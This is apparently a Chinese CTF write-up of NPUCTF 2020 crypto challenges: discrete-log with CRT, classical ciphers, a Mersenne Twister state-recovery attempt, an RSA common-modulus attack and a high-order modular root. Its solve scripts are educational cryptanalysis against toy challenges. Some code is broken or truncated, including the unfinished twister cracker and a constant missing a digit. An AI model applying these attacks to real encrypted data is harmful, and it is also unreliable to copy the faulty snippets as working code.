-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(g, a, p)</span>:</span></span><br><span class="line">    <span class="comment"># To solve g^e mod p = a and find e</span></span><br><span class="line">    <span class="comment"># define x = j*m + i</span></span><br><span class="line">    res = []</span><br><span class="line">    m = int(ceil(sqrt(p<span class="number">-1</span>)))</span><br><span class="line">    <span class="comment"># Baby Step</span></span><br><span class="line">    lookup_table = &#123;pow(g, i, p): i <span class="keyword">for</span> i <span class="keyword">in</span> range(m)&#125;</span><br><span class="line">    <span class="comment"># Giant Step Precomputation c = g^(-m) mod p</span></span><br><span class="line">    c = pow(g, m*(p<span class="number">-2</span>), p)</span><br><span class="line">    <span class="comment"># Giant Step</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(m):</span><br><span class="line">        x = (a*pow(c, j, p)) % p</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> lookup_table:</span><br><span class="line">			res.append( j*m + lookup_table[x])</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
-<p>先把原式子拆成：<br>
-$$<br>
-c=2^e \pmod {18195301 * 28977097} \Rightarrow<br>
-\begin{cases}<br>
-c=2^{e_1} \pmod {18195301}<br>
-\\<br>
-c=2^{e_2} \pmod {28977097}<br>
-\end{cases}<br>
-$$</p>
-<p>分别用 BSGS 算法求出指数，然后用中国剩余定理（下面是 <a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/" target="_blank" rel="noopener">0xDktb 师傅的代码</a>）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">18195301</span></span><br><span class="line">q = <span class="number">28977097</span></span><br><span class="line">c1_p, c1_q = c1 % p, c1 % q</span><br><span class="line">e_1, e_2 = bsgs(<span class="number">2</span>, c1_p, p), bsgs(<span class="number">2</span>, c1_q, q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e_n = [] <span class="comment"># e % n</span></span><br><span class="line"><span class="keyword">for</span> e_p <span class="keyword">in</span> e_1:</span><br><span class="line">    <span class="keyword">for</span> e_q <span class="keyword">in</span> e_2:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e_n.append(crt([e_p, e_q], [p - <span class="number">1</span>, q - <span class="number">1</span>])) <span class="comment"># e % phi</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">more_e_n = []</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> e_n:</span><br><span class="line">    i = (n - e) // phi</span><br><span class="line">    more_e_n += [e + j * phi <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, i + <span class="number">1</span>)]</span><br><span class="line">e_n += more_e_n</span><br><span class="line"></span><br><span class="line">d_n = [inverse(e, phi) <span class="keyword">for</span> e <span class="keyword">in</span> e_n]</span><br><span class="line"></span><br><span class="line">m_n = set()</span><br><span class="line">c = <span class="number">169169912654178</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> d_n:</span><br><span class="line">    m_n.add(pow(c, d, n))</span><br><span class="line">m_n = list(m_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> m_n:</span><br><span class="line">    print(<span class="string">b'npuctf&#123;'</span> + long_to_bytes(m) + <span class="string">b'&#125;'</span>)</span><br></pre></td></tr></table></figure>
-<hr>
-<h1>这是什么觅🐎</h1>
-<p>附件: zip</p>
-<p>解压之后得到图片<br>
-<img src="/2020/04/21/NPUCTF-Writeup/image-20200421115433262.png" alt="image-20200421115433262" style="zoom:50%;"></p>
-<h2 id="分析与解-v2">分析与解</h2>
-<h3 id="第一印象">第一印象</h3>
-<p>密文：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br></pre></td></tr></table></figure>
-<p>容易想到字母对应星期x 的英文首字母：<br>
-Monday - M, Tuesday - T1, Wednesday - W, Thursday - T2，Friday - F， Saturday - S1， Sunday - S2<br>
-紧接着的数字是行号相关的，所以猜测：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br><span class="line">3 	1 	12 	5 	14 	4 	8 	18</span><br><span class="line">3 	8 	12 	5 	14 	4 	8 	18</span><br><span class="line">flag&#123;31125144118&#125;</span><br><span class="line">flag&#123;0308120514040818&#125;</span><br><span class="line">p.s. 失败</span><br></pre></td></tr></table></figure>
-<h3 id="细节补充">细节补充</h3>
-<p>还有两个细节：</p>
-<ol>
-<li><code>1</code> 被差掉了</li>
-<li>数字 2 - 8 有圈</li>
-</ol>
-<h4 id="细节一">细节一</h4>
-<p>猜测：1 -&gt; <code>$</code>。即 所有 1  都替换成 <code>$</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3$$25$44$$8&#125;</span><br><span class="line">p.s. 失败</span><br></pre></td></tr></table></figure>
-<p>猜测：日历上的1跳过，即 W1 表示 8</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;38125144818&#125;</span><br><span class="line">p.s. 失败</span><br></pre></td></tr></table></figure>
-<h4 id="细节二">细节二</h4>
-<p>是否暗示 flag 所有的字符集都是在 2-8 之间呢？那 <code>F</code> 等之后的数字不意味着行，而意味着向后走 n 位。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br><span class="line">3   1   6   5   8   4   1   6</span><br><span class="line">flag&#123;31658416&#125;</span><br></pre></td></tr></table></figure>
-<p>这个猜想最大的问题在于 <code>S22</code> = <code>S13</code> ，不是唯一标识。<br>
-结合细节一和细节二：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">31658416 # 结合红圈，移位</span><br><span class="line">3$6584$6 # 结合红圈，移位 + 1 -&gt; $</span><br><span class="line">38658486 # 结合红圈，移位 + 1 -&gt; 8</span><br></pre></td></tr></table></figure>
-<p>均失败…… 😭😭😭</p>
-<h3 id="正解">正解</h3>
-<p>实际上，在第一步得到数字之和，转成字母就是 flag 😲</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F1 	W1 	S22 S21 T12 S11 W1 	S13</span><br><span class="line">3 	1 	12 	5 	14 	4 	8 	18</span><br><span class="line">c   a   l   e   n   d   h   r</span><br><span class="line">flag&#123;calendhr&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="陷入沉思">陷入沉思</h2>
-<p>果然是我想多了吗？？<br>
-可能是这方面的题目没怎么研究过😭</p>
-<h1>Classical_Cipher</h1>
-<p>附件：<strong>flag.zip</strong><br>
-<strong>key.txt</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">压缩包密码：	gsv_pvb_rh_zgyzhs</span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure>
-<h2 id="压缩包密码">压缩包密码</h2>
-<p>容易发现，已知明文中 <code>pvb</code> 和 <code>key</code> 存在互补关系（<code>ord(c) + ord(m) - 2*ord('a') % 25 == 0</code>）（atbash 密码的典型特征）<br>
-写个简单脚本处理一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cipher= <span class="string">"gsvpvbrhzgyzhs"</span></span><br><span class="line">msglst = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">	msglst.append(chr(<span class="number">25</span> - (ord(c)-ord(<span class="string">'a'</span>)) + ord(<span class="string">'a'</span>)))</span><br><span class="line">message = <span class="string">""</span>.join(msglst)</span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>
-<p>得到压缩包密码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">the_key_is_atbash</span><br></pre></td></tr></table></figure>
-<h2 id="图案密码">图案密码</h2>
-<p>经过解压后得到图片：<br>
-解压之后得到图片 flag.png<br>
-<img src="/2020/04/21/NPUCTF-Writeup/image-20200421122027883.png" alt="image-20200421122027883" style="zoom:67%;"></p>
-<p>可以看到猪圈密码和四个陌生的符号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">j ? ? p p l j ? ? j ? ? k</span><br></pre></td></tr></table></figure>
-<p>那四个陌生的符号可能是图标含义英文的首字母。<br>
-后来看 WP 的时候才知道是古埃及象形文字……（为什么破解古典密码的人这么多 😭，我……）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">j l w p p l j w l j o d k</span><br><span class="line">flag&#123;jlwppljwljodk&#125;</span><br><span class="line"># 不知道是不是这个格式</span><br></pre></td></tr></table></figure>
-<h1>Mersenne_twister</h1>
-<p>附件1：cipher.txt</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cef4876036ee8b55aa59bca043725bf350a5e491debdef7ef7d63e9609a288ca1e2c82a7fe566bd8709e73c8d495ea504a486ed11189faf8e6fb35617e47d2d1ad5e4783e96afeaae9f7104ec477fb39fe4ec619bf58289709e15c4449f03fc51cba918cd0ebfdc12376b41e7815406482733b3b200826b6c78d86563edaea94dccf459a4291517a4b8367d7b4a53aeecd7e0accf661bfc726f5ba62e1c0e04100108ad32e7d5711f780185cba5cf31d328bee84066be4ab9582cf9d4bfe3c6f96a7732e1c37d800c90fd46277147f0a26c149dcd5eeb0f2df0c075627bc220be5eefdd67186056ac28c21e155a7f247664aaecdb498134de274df10114d1f06f84dd21820f150d69c9439d909dec0f5ccfeab61b62db2ea91d31bc8163ff16c7f458006bd5ac4a5f5bfae2770b23ccfb7195b76aa0a9aa146831667a7b9fe08c19e691afadccb3ca5169ef3fabaa3dad47d536e89ed4cee6f788bc969c3ad3137850ebfc46a73af2b0c036c3da4b4a16506f499445c604dd73eeb846a52f881515a3ad0ab448b4f9ed3e0ab1fffac60b223dde6450ba6198e90e14de107aaf2</span><br></pre></td></tr></table></figure>
-<p>附件2：Mersenne_twister.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify , unhexlify</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag ,seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">26</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">7</span>] == <span class="string">'npuctf&#123;'</span></span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line">XOR = <span class="keyword">lambda</span> s1 ,s2 : bytes([x1 ^ x2 <span class="keyword">for</span> x1 ,x2 <span class="keyword">in</span> zip(s1 , s2)])</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt73991</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">        self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        self.srand()</span><br><span class="line">        self.generate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">            self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">            self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">            y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">                temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">            self.state[i] = temp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getramdanbits</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.flag == <span class="number">233</span>:</span><br><span class="line">            self.generate()</span><br><span class="line">            self.flag = <span class="number">0</span></span><br><span class="line">        bits = self.Next(self.state[self.flag]).to_bytes(<span class="number">4</span> , <span class="string">'big'</span>)</span><br><span class="line">        self.flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flag = flag.encode()</span><br><span class="line">    random = mt73991(seed)</span><br><span class="line">    f = open(<span class="string">'./cipher.txt'</span> , <span class="string">'wb'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">        cipher = encrypt(key , chr(i).encode())</span><br><span class="line">        f.write(cipher)</span><br></pre></td></tr></table></figure>
-<h2 id="分析-v2">分析</h2>
-<p>提供了它这里使用的梅森旋转算法<br>
-加密思路是：<br>
-​	每次加密明文：flag 里的每个字符<br>
-​	密钥：由 mt73991 对象生成的伪随机数（四个拼在一起）<br>
-​	加密函数：对明文一次 md5 加密，之后，加密后的明文和密钥逐位异或</p>
-<h2 id="解析-v2">解析</h2>
-<p>尝试写了一个对伪随机数预测的程序:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Mersenne_twister <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify , unhexlify</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemperInverser</span>:</span></span><br><span class="line">    __b = <span class="number">0x9ddf4680</span>    <span class="comment"># 比特遮罩1</span></span><br><span class="line">    __c = <span class="number">0xefc65400</span>    <span class="comment"># 比特遮罩2</span></span><br><span class="line">    __d = <span class="number">0x34adf670</span>    <span class="comment"># 比特遮罩3</span></span><br><span class="line">    __kMaxBits      =  <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inverse_right_shift_xor</span><span class="params">(self, value, shift, mask)</span>:</span></span><br><span class="line">        i, result = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">            part_mask = ((self.__kMaxBits &lt;&lt; (<span class="number">32</span> - shift)) &amp; self.__kMaxBits) &gt;&gt; (i * shift)</span><br><span class="line">            part = value &amp; part_mask</span><br><span class="line">            value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">            result |= part</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inverse_left_shift_xor</span><span class="params">(self, value, shift, mask)</span>:</span></span><br><span class="line">        i, result = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">            part_mask = (self.__kMaxBits &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (i * shift)</span><br><span class="line">            part = value &amp; part_mask</span><br><span class="line">            value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">            result |= part</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__inverse_temper</span><span class="params">(self, tempered)</span>:</span></span><br><span class="line">        value = tempered</span><br><span class="line">        value = self.__inverse_right_shift_xor(value, <span class="number">18</span>, self.__d)</span><br><span class="line">        value = self.__inverse_left_shift_xor(value, <span class="number">15</span>, self.__c)</span><br><span class="line">        value = self.__inverse_left_shift_xor(value, <span class="number">7</span>, self.__b)</span><br><span class="line">        value = self.__inverse_right_shift_xor(value, <span class="number">11</span>, self.__kMaxBits)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, tempered)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__inverse_temper(tempered)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MersenneTwisterCracker</span>:</span></span><br><span class="line">    __n = <span class="number">233</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mt_obj)</span>:</span></span><br><span class="line">        inverser  = TemperInverser()</span><br><span class="line">        register  = [inverser(int.from_bytes(random(), <span class="string">'big'</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> range(self.__n)]</span><br><span class="line">        self.__mt = mt73991(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># self.__state = 0</span></span><br><span class="line">        <span class="comment"># self.__register = register</span></span><br><span class="line">        self.__mt.load_register(register) <span class="comment"># 纠正</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.__mt()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(key , plain)</span>:</span></span><br><span class="line">    tmp = md5(plain).digest()</span><br><span class="line">    <span class="keyword">return</span> hexlify(XOR(tmp , key))</span><br><span class="line"></span><br><span class="line">all_letters = ascii_letters + digits + <span class="string">'.,;'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_md5</span><span class="params">(md5_value)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(md5_value)!=<span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    md5_value=md5_value.lower()</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> permutations(all_letters,k):</span><br><span class="line">            item=<span class="string">''</span>.join(item)</span><br><span class="line">            <span class="keyword">if</span> md5(item.encode()).hexdigest()==md5_value:</span><br><span class="line">                <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
-<p>但是发现没有 seed 还是不行。</p>
-<blockquote>
-<p>至少加深了对算法理解（自慰安慰 😢 ）<br>
-估计算法的深处藏有爆破 seed 的方法（否则 $2^{32}$ 没办法得到 seed）。</p>
-</blockquote>
-<h1>共模攻击</h1>
-<p>附件1：<strong><a href="http://hint.py" target="_blank" rel="noopener">hint.py</a></strong></p>
-<blockquote>
-<p>后来这个文件被下架了，直接给出其实 🔥😠🔥 .（好吧，其实没差，hhh）</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> hint</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = getPrime(<span class="number">32</span>), getPrime(<span class="number">32</span>)</span><br><span class="line">c1, c2 = pow(c, e1, n), pow(c, e2, n)</span><br><span class="line">print(n)</span><br><span class="line">print(e1, c1)</span><br><span class="line">print(e2, c2)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">107316975771284342108362954945096489708900302633734520943905283655283318535709</span></span><br><span class="line"><span class="string">6807492006219935335233722232024809784434293293172317282814978688931711423939629682224374870233587969960713638310068784415474535033780772766171320461281579</span></span><br><span class="line"><span class="string">2303413961, 1754421169036191391717309256938035960912941109206872374826444526733030696056821731708193270151759843780894750696642659795452787547355043345348714129217723</span></span><br><span class="line"><span class="string">2622163991,1613454015951555289711148366977297613624544025937559371784736059448454437652633847111272619248126613500028992813732842041018588707201458398726700828844249</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
-<p><strong><a href="http://task.py" target="_blank" rel="noopener">task.py</a></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.strip(<span class="string">b"npuctf&#123;"</span>).strip(<span class="string">b"&#125;"</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = p, q</span><br><span class="line">c1, c2 = pow(m, e1, n), pow(m, e2, n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">128205304743751985889679351195836799434324346996129753896234917982647254577214018524580290192396070591032007818847697193260130051396080104704981594190602854241936777324431673564677900773992273463534717009587530152480725448774018550562603894883079711995434332008363470321069097619786793617099517770260029108149</span></span><br><span class="line"><span class="string">96860654235275202217368130195089839608037558388884522737500611121271571335123981588807994043800468529002147570655597610639680977780779494880330669466389788497046710319213376228391138021976388925171307760030058456934898771589435836261317283743951614505136840364638706914424433566782044926111639955612412134198</span></span><br><span class="line"><span class="string">9566853166416448316408476072940703716510748416699965603380497338943730666656667456274146023583837768495637484138572090891246105018219222267465595710692705776272469703739932909158740030049375350999465338363044226512016686534246611049299981674236577960786526527933966681954486377462298197949323271904405241585</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
-<h2 id="hint-py"><a href="http://hint.py" target="_blank" rel="noopener">hint.py</a></h2>
-<h3 id="共模攻击">共模攻击</h3>
-<p><strong>第一部分：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p, q = getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = getPrime(<span class="number">32</span>), getPrime(<span class="number">32</span>)</span><br><span class="line">c1, c2 = pow(c, e1, n), pow(c, e2, n)</span><br><span class="line">print(n)</span><br><span class="line">print(e1, c1)</span><br><span class="line">print(e2, c2)</span><br></pre></td></tr></table></figure>
-<p>典型的共模攻击，破解：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">_, r, s = gcdext(e1, e2)</span><br><span class="line">c = pow(c1, r, n) * pow(c2, s, n) % n</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure>
-<h3 id="高次剩余">高次剩余</h3>
-<p><strong>第二部分：</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>
-<p>$$<br>
-c = m^{256} \pmod p<br>
-$$</p>
-<p>这里要进行高次剩余方程求解。<br>
-不过网上的板子几乎都是用 C++ 写的（ICPCer 的作品…）我也尝试过用 <a href="https://blog.csdn.net/dreamzuora/article/details/52744666" target="_blank" rel="noopener">N次剩余(详解+例题+代码)</a> 的 CPP 板子，然而…… <code>c </code> 是在太大，不得行…… 🙂</p>
-<blockquote>
-<p>关于算法，有篇博客写得很全面：<a href="https://www.cnblogs.com/zhouzhendong/p/Number-theory-Residue-System.html" target="_blank" rel="noopener">数论算法 剩余系相关 学习笔记 (基础回顾,(ex)CRT,(ex)lucas,(ex)BSGS,原根与指标入门,高次剩余,Miller_Robin+Pollard_Rho)</a> （仰望 ICPCer）</p>
-<p>可以调用大整数库，写下算法……（濒危动物表示写不动 😭 ）</p>
-</blockquote>
-<h4 id="Sympy">Sympy</h4>
-<p>后来发现 Sympy 里有求 高次剩余的函数……</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">19384002358725759679198917686763310349050988223627625096050800369760484237557</span></span><br><span class="line">n = <span class="number">107316975771284342108362954945096489708900302633734520943905283655283318535709</span></span><br><span class="line">mlst = nthroot_mod(c, <span class="number">256</span>, n, all_roots=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> mlst:</span><br><span class="line">    <span class="keyword">assert</span> pow(m, <span class="number">256</span>, n) == c</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>
-<p>输出：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m.bit_length() &lt; 400</span><br><span class="line">��&#125;�&#123;�6�k����Zs�A����U�H���</span><br><span class="line">�%��������)&#x3D;�-q������L�P\?�</span><br><span class="line">�CAz</span><br><span class="line">KA���UA��X*gp&#125;-LX��</span><br></pre></td></tr></table></figure>
-<h4 id="mma-Sage">mma / Sage</h4>
-<p>用 mma：</p>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Simplify</span>[</span><br><span class="line"> <span class="keyword">Reduce</span>[</span><br><span class="line">  c == <span class="keyword">Mod</span>[m^<span class="number">256</span>, p] /.</span><br><span class="line">   &#123;c -&gt; <span class="number">1938400235872575967919891768676331034905098822362762509605080</span>\</span><br><span class="line"><span class="number">0369760484237557</span>,</span><br><span class="line">    p -&gt; <span class="number">1073169757712843421083629549450964897089003026337345209439052</span>\</span><br><span class="line"><span class="number">83655283318535709</span>&#125;,</span><br><span class="line">  m, <span class="keyword">Integers</span></span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-<p>或者用 SageMath：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">107316975771284342108362954945096489708900302633734520943905283655283318535709</span></span><br><span class="line">c = <span class="number">1938400235872575967919891768676331034905098822362762509605080036976048423755</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x^<span class="number">256</span> - c</span><br><span class="line">f.monic().roots()</span><br></pre></td></tr></table></figure>
-<p>+Python</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mlist = [<span class="number">623314401187286670257694436875298172611109072944</span>,<span class="number">11812523831006378212663497485315375112114782670326938195125719701658999904789</span>, <span class="number">95504451940277963895699457459781114596785519963407582748779563953624318630920</span>, <span class="number">107316975771284342108362954944473175307713015963476826507029985482672209462765</span>]</span><br><span class="line">msglst =[]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> mlist:</span><br><span class="line">    <span class="keyword">assert</span> pow(m, <span class="number">256</span>, p) == c</span><br><span class="line">    msglst.append(long_to_bytes(m))</span><br><span class="line">msglst</span><br></pre></td></tr></table></figure>
-<p>输出：</p>
